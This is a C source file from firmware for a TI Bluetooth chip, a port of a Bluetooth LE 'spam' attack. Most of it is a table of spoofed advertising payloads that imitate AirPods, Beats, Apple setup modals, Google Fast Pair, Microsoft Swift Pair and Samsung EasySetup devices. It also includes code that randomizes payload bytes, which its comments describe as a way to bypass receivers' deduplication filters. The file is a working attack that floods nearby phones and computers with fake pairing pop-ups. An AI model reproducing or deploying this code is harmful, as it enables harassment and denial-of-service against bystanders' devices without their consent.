/******************************************************************************

 @file  ble_spam_models.c

 @brief Portable spam model table and payload randomization (Phase 2).

	Ported from Minino firmware/components/bt_spam/bt_spam.c: the
	82-entry model table (bytes unaltered), the per-mode filtering and
	the per-type ephemeral byte randomization that bypasses receiver
	deduplication filters. This file must stay free of any TI or ESP
	header so it can be unit-tested on the host.

 Group: WCS, BTS
 Target Device: cc13xx_cc26xx

 *****************************************************************************/

#include "ble_spam_models.h"

#include <stddef.h>
#include <string.h>

/*
 * SAMSUNG EASY SETUP (Company ID 0x0075) - formatos verificados contra
 * simondankelmann/Bluetooth-LE-Spam (generadores EasySetupWatch/EasySetupBuds,
 * IDs originales de Flipper-XFW easysetup.c). El magic es fijo: solo cambia el
 * id de modelo/color al final del prefijo. La variacion anti-dedup la aporta
 * la rotacion de MAC aleatoria que ya hace el ciclo de advertising.
 *
 *   Watch: [0e ff 75 00] 01 00 02 00 01 01 ff 00 00 43 <watch_id>
 *   Buds:  [1b ff 75 00] 42 09 81 02 14 15 03 21 01 09 <a> <b> 01 <c>
 *                        06 3c 94 8e 00 00 00 00 c7 00
 */
#define SPAM_SAMSUNG_WATCH(id, model_name)                                \
	{                                                                 \
		.name = model_name,                                       \
		.type = SPAM_TYPE_SAMSUNG_SETUP,                          \
		.len = 15,                                                \
		.data = { 0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, \
			  0x01, 0x01, 0xff, 0x00, 0x00, 0x43, id },       \
	}

#define SPAM_SAMSUNG_BUDS(a, b, c, model_name)                        \
	{                                                             \
		.name = model_name,                                   \
		.type = SPAM_TYPE_SAMSUNG_SETUP,                      \
		.len = 28,                                            \
		.data = { 0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81,   \
			  0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09,   \
			  a,	b,    0x01, c,	  0x06, 0x3c, 0x94,   \
			  0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00 }, \
	}

static const spam_model_t spam_models[] = {
	/* =======================================================================
	 * 1. APPLE PROXIMITY PAIRING (AirPods, Beats) - Type 0x07
	 * =======================================================================
	 */
	{
		.name = "Apple AirPods 1",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Apple AirPods 2",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Apple AirPods 3",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Apple AirPods Pro",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Apple AirPods Pro 2",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Apple AirPods Max",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Powerbeats",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Powerbeats Pro",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Beats Solo Pro",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Beats Studio Buds",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Beats Flex",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Beats Studio Pro",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Beats Fit Pro",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Beats Studio Buds+",
		.type = SPAM_TYPE_APPLE_PROXIMITY,
		.len = 31,
		.data = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16,
			  0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
			  0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},

	/* =======================================================================
	 * 2. APPLE CONTINUITY / NEARBY ACTION MODALS - Type 0x10
	 * =======================================================================
	 */
	{
		.name = "AppleTV Setup",
		.type = SPAM_TYPE_APPLE_ACTION,
		.len = 17,
		.data = { 0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x20, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Transfer Number",
		.type = SPAM_TYPE_APPLE_ACTION,
		.len = 17,
		.data = { 0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x27, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "AirDrop Modal",
		.type = SPAM_TYPE_APPLE_ACTION,
		.len = 17,
		.data = { 0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x09, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "HomePod Setup",
		.type = SPAM_TYPE_APPLE_ACTION,
		.len = 17,
		.data = { 0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x0d, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "AppleTV Keyboard",
		.type = SPAM_TYPE_APPLE_ACTION,
		.len = 17,
		.data = { 0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x05, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Apple Watch Setup",
		.type = SPAM_TYPE_APPLE_ACTION,
		.len = 17,
		.data = { 0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x01, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "Setup New Phone",
		.type = SPAM_TYPE_APPLE_ACTION,
		.len = 17,
		.data = { 0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x2b, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},
	{
		.name = "AppleTV Audio",
		.type = SPAM_TYPE_APPLE_ACTION,
		.len = 17,
		.data = { 0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x13, 0x00,
			  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	},

	/* =======================================================================
	 * 3. GOOGLE FAST PAIR (Android) - Service UUID 0xFE2C + TxPower Level
	 * (-21 dBm)
	 * =======================================================================
	 */
	{
		.name = "Google Pixel Buds",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0xdf, 0x28, 0x03, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "Pixel Buds Pro",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0x71, 0x8f, 0xa4, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "Pixel Buds A-Series",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0xa6, 0xb7, 0x96, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "Samsung Galaxy Buds FP",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0xee, 0x49, 0x23, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "Sony WH-1000XM4",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0x01, 0x82, 0x1e, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "Sony WF-1000XM4",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0x27, 0x18, 0x00, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "JBL Flip 6",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0xaa, 0x22, 0x11, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "Bose QC35 II",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0xf6, 0xc4, 0x20, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "JBL Live 300",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0x0a, 0x00, 0x02, 0x02, 0x0a, 0xeb },
	},
	{
		.name = "OnePlus Buds",
		.type = SPAM_TYPE_GOOGLE_FAST_PAIR,
		.len = 17,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16,
			  0x2c, 0xfe, 0xdf, 0xa9, 0xc4, 0x02, 0x0a, 0xeb },
	},

	/* =======================================================================
	 * 4. MICROSOFT SWIFT PAIR (Windows 10 / 11) - Appearance (0x19) +
	 * Beacon (0x03) + Name (0x09)
	 * =======================================================================
	 */
	{
		.name = "MS Surface Mouse",
		.type = SPAM_TYPE_MICROSOFT_SWIFT,
		.len = 29,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x19, 0xc2, 0x03, 0x06,
			  0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09,
			  'S',	'u',  'r',  'f',  'a',	'c',  'e',  ' ',
			  'M',	'o',  'u',  's',  'e' },
	},
	{
		.name = "MS Surface Keyboard",
		.type = SPAM_TYPE_MICROSOFT_SWIFT,
		.len = 27,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x19, 0xc1, 0x03, 0x06, 0xff,
			  0x06, 0x00, 0x03, 0x00, 0x80, 0x0c, 0x09, 'S',  'u',
			  'r',	'f',  'a',  'c',  'e',	' ',  'K',  'b',  'd' },
	},
	{
		.name = "MS Surface Audio",
		.type = SPAM_TYPE_MICROSOFT_SWIFT,
		.len = 29,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x19, 0x42, 0x08, 0x06,
			  0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09,
			  'S',	'u',  'r',  'f',  'a',	'c',  'e',  ' ',
			  'A',	'u',  'd',  'i',  'o' },
	},
	{
		.name = "Xbox Controller",
		.type = SPAM_TYPE_MICROSOFT_SWIFT,
		.len = 31,
		.data = { 0x02, 0x01, 0x06, 0x03, 0x19, 0xc4, 0x03, 0x06,
			  0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x10, 0x09,
			  'X',	'b',  'o',  'x',  ' ',	'C',  'o',  'n',
			  't',	'r',  'o',  'l',  'l',	'e',  'r' },
	},

	/* =======================================================================
	 * 5. SAMSUNG EASY SETUP - Company ID 0x0075
	 * Watch = baliza Galaxy Watch (popup "Como conectar tu reloj");
	 * Buds  = EasySetup de auriculares (popup de emparejamiento Buds).
	 * IDs genuinos de Flipper-XFW easysetup.c / simondankelmann.
	 * =======================================================================
	 */
	SPAM_SAMSUNG_WATCH(0x1a, "Fallback Watch"),
	SPAM_SAMSUNG_WATCH(0x01, "White W4 Classic 44mm"),
	SPAM_SAMSUNG_WATCH(0x02, "Black W4 Classic 40mm"),
	SPAM_SAMSUNG_WATCH(0x03, "White W4 Classic 40mm"),
	SPAM_SAMSUNG_WATCH(0x04, "Black W4 44mm"),
	SPAM_SAMSUNG_WATCH(0x05, "Silver W4 44mm"),
	SPAM_SAMSUNG_WATCH(0x06, "Green W4 44mm"),
	SPAM_SAMSUNG_WATCH(0x07, "Black W4 40mm"),
	SPAM_SAMSUNG_WATCH(0x08, "White W4 40mm"),
	SPAM_SAMSUNG_WATCH(0x09, "Gold W4 40mm"),
	SPAM_SAMSUNG_WATCH(0x0a, "French W4"),
	SPAM_SAMSUNG_WATCH(0x0b, "French W4 Classic"),
	SPAM_SAMSUNG_WATCH(0x0c, "Fox W5 44mm"),
	SPAM_SAMSUNG_WATCH(0x11, "Black W5 44mm"),
	SPAM_SAMSUNG_WATCH(0x12, "Sapphire W5 44mm"),
	SPAM_SAMSUNG_WATCH(0x13, "Purple W5 40mm"),
	SPAM_SAMSUNG_WATCH(0x14, "Gold W5 40mm"),
	SPAM_SAMSUNG_WATCH(0x15, "Black W5 Pro 45mm"),
	SPAM_SAMSUNG_WATCH(0x16, "Gray W5 Pro 45mm"),
	SPAM_SAMSUNG_WATCH(0x17, "White W5 44mm"),
	SPAM_SAMSUNG_WATCH(0x18, "White Black W5"),
	SPAM_SAMSUNG_WATCH(0x1b, "Black W6 Pink 40mm"),
	SPAM_SAMSUNG_WATCH(0x1c, "Gold W6 40mm"),
	SPAM_SAMSUNG_WATCH(0x1d, "Silver W6 Cyan 44mm"),
	SPAM_SAMSUNG_WATCH(0x1e, "Black W6 Classic 43mm"),
	SPAM_SAMSUNG_WATCH(0x20, "Green W6 Classic 43mm"),

	SPAM_SAMSUNG_BUDS(0xee, 0x7a, 0x0c, "Fallback Buds"),
	SPAM_SAMSUNG_BUDS(0x9d, 0x17, 0x00, "Fallback Dots"),
	SPAM_SAMSUNG_BUDS(0x39, 0xea, 0x48, "Light Purple Buds2"),
	SPAM_SAMSUNG_BUDS(0xa7, 0xc6, 0x2c, "Bluish Silver Buds2"),
	SPAM_SAMSUNG_BUDS(0x85, 0x01, 0x16, "Black Buds Live"),
	SPAM_SAMSUNG_BUDS(0x3d, 0x8f, 0x41, "Gray Black Buds2"),
	SPAM_SAMSUNG_BUDS(0x3b, 0x6d, 0x02, "Bluish Chrome Buds2"),
	SPAM_SAMSUNG_BUDS(0xae, 0x06, 0x3c, "Gray Beige Buds2"),
	SPAM_SAMSUNG_BUDS(0xb8, 0xb9, 0x05, "Pure White Buds"),
	SPAM_SAMSUNG_BUDS(0xea, 0xaa, 0x17, "Pure White Buds2"),
	SPAM_SAMSUNG_BUDS(0xd3, 0x07, 0x04, "Black Buds"),
	SPAM_SAMSUNG_BUDS(0x9d, 0xb0, 0x06, "French Flag Buds"),
	SPAM_SAMSUNG_BUDS(0x10, 0x1f, 0x1a, "Dark Purple Buds Live"),
	SPAM_SAMSUNG_BUDS(0x85, 0x96, 0x08, "Dark Blue Buds"),
	SPAM_SAMSUNG_BUDS(0x8e, 0x45, 0x03, "Pink Buds"),
	SPAM_SAMSUNG_BUDS(0x2c, 0x67, 0x40, "White Black Buds2"),
	SPAM_SAMSUNG_BUDS(0x3f, 0x67, 0x18, "Bronze Buds Live"),
	SPAM_SAMSUNG_BUDS(0x42, 0xc5, 0x19, "Red Buds Live"),
	SPAM_SAMSUNG_BUDS(0xae, 0x07, 0x3a, "Black White Buds2"),
	SPAM_SAMSUNG_BUDS(0x01, 0x17, 0x16, "Sleek Black Buds2"),
};

#define TOTAL_SPAM_MODELS (sizeof(spam_models) / sizeof(spam_models[0]))

/*********************************************************************
 * LOCAL VARIABLES
 */

static uint8_t active_indices[TOTAL_SPAM_MODELS];
static uint8_t active_indices_count = 0;

/* xorshift32 state; never 0 (spam_models_seed remaps 0 to a constant). */
static uint32_t rng_state = 0x2545F491u;

/*********************************************************************
 * LOCAL FUNCTIONS
 */

/*
 * Per-mode filter. Semantics identical to the reference implementation.
 * Returns uint8_t (0/1) instead of bool to keep the file free of
 * <stdbool.h> per the portable-layer constraints.
 */
static uint8_t model_matches_mode(const spam_model_t *model,
				  bt_spam_mode_t mode)
{
	switch (mode) {
	case BT_SPAM_MODE_APPLE:
		return (model->type == SPAM_TYPE_APPLE_PROXIMITY ||
			model->type == SPAM_TYPE_APPLE_ACTION);
	case BT_SPAM_MODE_ANDROID:
		return (model->type == SPAM_TYPE_GOOGLE_FAST_PAIR);
	case BT_SPAM_MODE_WINDOWS:
		return (model->type == SPAM_TYPE_MICROSOFT_SWIFT);
	case BT_SPAM_MODE_SAMSUNG:
		return (model->type == SPAM_TYPE_SAMSUNG_SETUP);
	case BT_SPAM_MODE_ALL:
	default:
		return 1;
	}
}

/*
 * Fast xorshift32 PRNG. Seeded once per boot from the TRNG driver (on
 * target) or with a fixed value (host tests); never per byte.
 */
static uint32_t spam_models_rand(void)
{
	uint32_t x = rng_state;

	x ^= x << 13;
	x ^= x >> 17;
	x ^= x << 5;
	rng_state = x;
	return x;
}

/*********************************************************************
 * PUBLIC FUNCTIONS
 */

void spam_models_init(void)
{
	spam_models_seed(0x2545F491u);
	spam_models_rebuild_active(BT_SPAM_MODE_ALL);
}

void spam_models_seed(uint32_t seed)
{
	/* xorshift32 is stuck at 0: remap a zero seed to keep it moving. */
	rng_state = (seed != 0u) ? seed : 1u;
}

void spam_models_rebuild_active(bt_spam_mode_t mode)
{
	uint8_t i;

	active_indices_count = 0;
	for (i = 0; i < (uint8_t)TOTAL_SPAM_MODELS; i++) {
		if (model_matches_mode(&spam_models[i], mode)) {
			active_indices[active_indices_count++] = i;
		}
	}
	if (active_indices_count == 0) {
		for (i = 0; i < (uint8_t)TOTAL_SPAM_MODELS; i++) {
			active_indices[i] = i;
		}
		active_indices_count = (uint8_t)TOTAL_SPAM_MODELS;
	}
}

uint8_t spam_models_count(void)
{
	return active_indices_count;
}

uint8_t spam_models_index(uint8_t active_idx)
{
	if (active_indices_count == 0) {
		return 0;
	}
	return active_indices[active_idx % active_indices_count];
}

uint8_t spam_models_prepare(uint8_t active_idx, spam_model_t *out)
{
	const spam_model_t *model;

	if (out == NULL || active_indices_count == 0) {
		return 0;
	}
	if (active_idx >= active_indices_count) {
		active_idx = (uint8_t)(active_idx % active_indices_count);
	}

	model = &spam_models[active_indices[active_idx]];
	*out = *model;

	/*
	 * Dynamic randomization of ephemeral fields to bypass receiver
	 * deduplication filters. Byte positions replicate prepare_payload()
	 * of the reference implementation exactly.
	 */
	switch (out->type) {
	case SPAM_TYPE_APPLE_PROXIMITY:
		/* Randomize Lid counter / sequence (byte 11) and Auth tag
		 * (bytes 15-18)
		 */
		out->data[11] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[15] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[16] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[17] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[18] = (uint8_t)(spam_models_rand() & 0xFFu);
		break;

	case SPAM_TYPE_APPLE_ACTION:
		/* Randomize auth bytes (bytes 9-14) */
		out->data[9] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[10] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[11] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[12] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[13] = (uint8_t)(spam_models_rand() & 0xFFu);
		out->data[14] = (uint8_t)(spam_models_rand() & 0xFFu);
		break;

	case SPAM_TYPE_MICROSOFT_SWIFT:
		/* In Swift Pair with Appearance: byte 13 is reserved RSSI byte,
		 * byte 12 is subscenario
		 */
		break;

	case SPAM_TYPE_SAMSUNG_SETUP:
		/* Magic EasySetup fijo: en Watch los bytes 8-13 son parte de la
		 * firma (01 ff 00 00 43). No randomizar nada aqui; la variacion
		 * anti-dedup proviene del id de modelo y de la MAC aleatoria
		 * por ciclo.
		 */
		break;

	case SPAM_TYPE_GOOGLE_FAST_PAIR:
	default:
		break;
	}

	return out->len;
}

const char *spam_models_mode_name(bt_spam_mode_t mode)
{
	switch (mode) {
	case BT_SPAM_MODE_ALL:
		return "ALL";
	case BT_SPAM_MODE_APPLE:
		return "APPLE";
	case BT_SPAM_MODE_ANDROID:
		return "ANDROID";
	case BT_SPAM_MODE_WINDOWS:
		return "WINDOWS";
	case BT_SPAM_MODE_SAMSUNG:
		return "SAMSUNG";
	case BT_SPAM_MODE_MAX:
	default:
		return "UNKNOWN";
	}
}
